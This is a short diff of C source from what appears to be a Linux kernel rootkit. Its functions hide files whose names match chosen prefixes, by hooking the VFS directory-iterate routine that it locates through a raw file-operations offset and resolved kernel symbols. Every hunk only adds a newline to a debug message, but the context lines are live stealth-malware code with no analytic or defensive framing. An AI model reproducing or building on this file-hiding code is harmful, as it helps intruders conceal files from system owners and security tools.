@@ -15,7 +15,7 @@ static int is_name_hidden(const char *name)
 		unsigned int len = anima_strlen(hidden_file[i]);
 		if (hidden_file[i][0] &&
 		    !anima_strncmp(hidden_file[i], name, len)) {
-			pr_debug("%s: hiding %s", __func__, name);
+			pr_debug("%s: hiding %s\n", __func__, name);
 			return 1;
 		}
 	}
@@ -40,7 +40,7 @@ static void *get_vfs_iterate(const char *path)
 
 	/* get filep->f_op->iterate */
 	iterate = (char *)(*(unsigned long *)(f_op + 8*8));
-	pr_debug("%s: iterate=%p", __func__, iterate);
+	pr_debug("%s: iterate=%p\n", __func__, iterate);
 
 	ksyms.filp_close(filep, 0);
 
@@ -75,7 +75,7 @@ static void vfs_iterate_hook(struct pt_regs *regs)
  */
 int hide_filename_starting_with(const char *name, unsigned int len)
 {
-	pr_debug("%s: name=%s", __func__, name);
+	pr_debug("%s: name=%s\n", __func__, name);
 
 	len = len >= FILENAME_SIZE ? FILENAME_SIZE-1 : len;
 
@@ -98,7 +98,7 @@ int unhide_filename_starting_with(const char *name, unsigned int len)
 	if (ksyms._copy_from_user(kname, name, len))
 		return -1;
 
-	pr_debug("%s: name=%s", __func__, name);
+	pr_debug("%s: name=%s\n", __func__, name);
 
 	for (int i = 0; i < MAX_HIDDEN_FILES; i++)
 		if (anima_strncmp(hidden_file[i], kname, FILENAME_SIZE))
